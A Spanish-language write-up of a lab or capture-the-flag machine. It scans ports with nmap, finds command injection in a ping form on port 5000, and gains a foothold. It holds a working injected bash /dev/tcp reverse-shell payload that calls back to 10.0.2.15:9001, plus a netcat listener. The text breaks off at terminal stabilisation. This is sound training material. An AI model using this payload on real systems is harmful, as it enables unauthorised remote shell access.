<img width="545" height="299" alt="Captura de pantalla 2025-09-23 170736" src="https://github.com/user-attachments/assets/2f8b1305-76a5-42d9-8122-fb5f55aab496" />



# Enumeracion de Puertos,Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sV --min-rate 5000 172.17.0.2 -oN nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 22:35 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
5000/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Nos iremos al dominio en el puerto 5000 y veremos lo siguiente

<img width="1185" height="757" alt="image" src="https://github.com/user-attachments/assets/5b198aac-481f-43e5-95f3-9dc29549db12" />

Analizando mas este ping, nos damos  cuenta que podemos hacer una ejecucion de comandos remotos (Remote Code Execution. Es una vulnerabilidad/condición en la que un atacante puede hacer que un sistema remoto ejecute código arbitrario)

De tal manera nos ponemos en escucha con Net cat en el puerto 9001

```ruby
     nc -lvnp 9001
```

Iremos a preparar una revershell, usaremos && y despues la revshell


<img width="1185" height="659" alt="image" src="https://github.com/user-attachments/assets/e5269586-47ca-486c-9866-da930c69658f" />

```ruby
localhost && bash -c 'exec 5<>/dev/tcp/10.0.2.15/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'
```

ya tendriamos la conexion con esto:

<img width="476" height="166" alt="image" src="https://github.com/user-attachments/assets/78e83ecd-2821-4bb5-baba-b841fd86163a" />

# Acceso a maquina 

Aremos un tratamiento de la terminal, para no tener problas de ejecuciones 
